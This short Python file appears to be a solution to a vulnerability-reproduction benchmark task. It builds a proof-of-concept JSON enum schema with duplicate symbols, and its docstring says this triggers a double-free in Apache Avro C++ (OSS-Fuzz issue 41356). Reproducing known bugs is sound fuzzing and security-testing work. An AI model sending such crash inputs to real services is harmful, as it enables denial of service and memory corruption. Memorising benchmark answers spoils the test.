import json

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The problem corresponds to OSS-Fuzz issue 41356 in Apache Avro C++ (typo 'arvo' in prompt).
        The vulnerability is a double-free triggered when Node::add throws an exception.
        This occurs when defining an Enum schema with duplicate symbols.
        """
        # Construct a minimal payload with duplicate enum symbols to trigger the exception in Node::add
        poc = {
            "type": "enum",
            "name": "a",
            "symbols": ["b", "b"]
        }
        
        # Return the compact JSON representation
        return json.dumps(poc, separators=(',', ':')).encode('utf-8')